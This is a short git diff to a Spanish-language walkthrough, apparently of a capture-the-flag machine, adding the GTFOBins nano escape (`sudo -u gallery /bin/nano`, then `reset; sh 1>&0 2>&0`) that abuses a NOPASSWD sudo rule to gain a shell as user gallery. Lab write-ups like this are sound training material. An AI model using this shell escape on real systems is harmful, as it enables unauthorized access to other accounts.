@@ -42,8 +42,13 @@ export TERM=xterm
 Una vez tratada, ejecutaremos `sudo -l` y encontraremos `(gallery) NOPASSWD: /bin/nano`
 <img width="572" height="174" alt="image" src="https://github.com/user-attachments/assets/eacedecf-628b-47ad-acdd-eb1d99b11da1" />
 
-Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell)
-
+Por lo que de acuerdo con [GTFObins](https://gtfobins.org/gtfobins/nano/#shell) ejecutaremos los siguiente comando:
+```
+sudo -u gallery /bin/nano
+Ctrl+R Ctrl+X
+reset; sh 1>&0 2>&0
+```
+Y habremos obtenido acceso al usuario `gallery`
 
 
 
